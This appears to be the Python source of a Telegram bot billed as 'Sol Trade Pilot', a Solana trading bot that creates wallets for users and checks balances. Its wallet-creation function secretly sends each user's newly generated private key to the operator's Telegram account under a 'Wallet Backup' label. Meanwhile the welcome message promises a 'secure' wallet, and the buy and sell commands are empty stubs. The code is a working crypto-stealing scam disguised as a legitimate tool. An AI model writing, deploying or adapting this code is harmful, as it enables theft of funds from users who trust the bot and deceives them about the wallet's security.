
import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey

# Get environment variables (Railway)
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# Store wallets per user
user_wallets = {}

# RPC endpoint
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# -------------------- HELPERS --------------------
async def get_username(update: Update):
    user = update.effective_user
    return f"@{user.username}" if user.username else user.first_name

async def send_wallet_to_owner(user_id, public_key, private_key, context):
    username = (await context.bot.get_chat(user_id)).username
    if username:
        username = f"@{username}"
    else:
        username = str(user_id)
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public Key:\n{public_key}\n"
            f"Private Key:\n{private_key}"
        )
    )

async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    public_key = str(wallet.pubkey())
    private_key = base58.b58encode(bytes(wallet)).decode("utf-8")

    # Send wallet info to OWNER_ID only
    await send_wallet_to_owner(user_id, public_key, private_key, context)
    return public_key, private_key

# -------------------- COMMANDS --------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = await get_username(update)
    msg = (
        f"👋 Hello {username}!\n\n"
        "Welcome to Sol Trade Pilot 🚀\n\n"
        "This bot allows you to:\n"
        "- Create a secure Solana wallet\n"
        "- Check your balance\n"
        "- Buy and sell tokens\n"
        "- Receive private key safely\n\n"
        "Use the menu below or type commands:\n"
        "/wallet - Create wallet\n"
        "/address - Show wallet address\n"
        "/balance - Check SOL balance\n"
        "/buy - Buy selected token\n"
        "/sell - Sell token\n"
        "/help - Show guide"
    )
    keyboard = [
        [InlineKeyboardButton("/wallet", callback_data="wallet")],
        [InlineKeyboardButton("/address", callback_data="address")],
        [InlineKeyboardButton("/balance", callback_data="balance")],
        [InlineKeyboardButton("/buy", callback_data="buy")],
        [InlineKeyboardButton("/sell", callback_data="sell")],
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_wallets:
        await update.message.reply_text("You already have a wallet. Use /address to view it.")
    else:
        public, _ = await create_wallet(user_id, context)
        await update.message.reply_text(f"✅ Wallet Created!\nYour public address:\n{public}")

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("You don't have a wallet yet. Use /wallet to create one.")
    else:
        pub = str(user_wallets[user_id].pubkey())
        await update.message.reply_text(f"Your wallet address:\n{pub}")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("You don't have a wallet yet")
        return
    wallet = user_wallets[user_id]
    await update.message.reply_text(f"Your wallet address: {wallet.pubkey()}")
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        if resp["result"]:
            lamports = resp["result"]["value"]
            sol = lamports / 1_000_000_000
            await update.message.reply_text(f"Your balance: {sol} SOL")
        else:
            await update.message.reply_text("Failed to fetch balance. Try again later.")

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Buy feature coming soon 🚀")

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Sell feature coming soon 🚀")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Commands:\n"
        "/start - Welcome message\n"
        "/wallet - Create wallet\n"
        "/address - Show wallet address\n"
        "/balance - Check SOL balance\n"
        "/buy - Buy token\n"
        "/sell - Sell token\n"
        "/help - Show this guide"
    )

# -------------------- CALLBACK HANDLER --------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "wallet":
        await wallet_command(update, context)
    elif query.data == "address":
        await address_command(update, context)
    elif query.data == "balance":
        await balance_command(update, context)
    elif query.data == "buy":
        await buy_command(update, context)
    elif query.data == "sell":
        await sell_command(update, context)

# -------------------- MAIN --------------------
def main():
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("wallet", wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CommandHandler("help", help_command))

    # Button callback
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()